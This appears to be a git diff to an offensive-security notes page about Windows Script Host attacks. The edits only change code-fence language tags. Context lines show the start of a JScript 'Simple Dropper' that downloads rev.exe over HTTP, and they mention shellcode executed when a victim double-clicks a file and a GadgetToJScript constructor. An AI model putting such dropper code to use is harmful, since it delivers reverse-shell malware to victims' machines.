@@ -6,7 +6,7 @@ VBScript and Jscript are executed by the windows script host. they run by the wi
 
 ## <mark style="color:red;">Simple Dropper</mark>
 
-```
+```vba
 var url = "http://192.168.56.1/rev.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 Object.Open('GET', url, false);
@@ -147,7 +147,7 @@ when the victim double clicks the jscript file, the shellcode will be executed.
 
 {% embed url="https://github.com/med0x2e/GadgetToJScript" %}
 
-```
+```csharp
 #Create a constructor. Save as source.cs
 
 using System;
